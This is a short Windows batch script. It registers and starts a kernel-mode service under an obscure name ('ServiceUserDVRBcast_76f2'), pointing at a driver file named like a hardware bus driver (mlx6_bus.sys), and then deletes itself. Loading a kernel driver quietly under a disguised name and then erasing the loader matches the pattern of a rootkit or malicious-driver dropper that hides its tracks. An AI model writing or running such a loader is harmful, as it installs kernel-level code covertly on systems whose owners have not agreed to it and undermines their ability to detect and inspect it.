@echo off
cd %~dp0
sc create ServiceUserDVRBcast_76f2 binpath=C:\Windows\System32\drivers\mlx6_bus.sys type=kernel
sc start ServiceUserDVRBcast_76f2
del "%~f0"



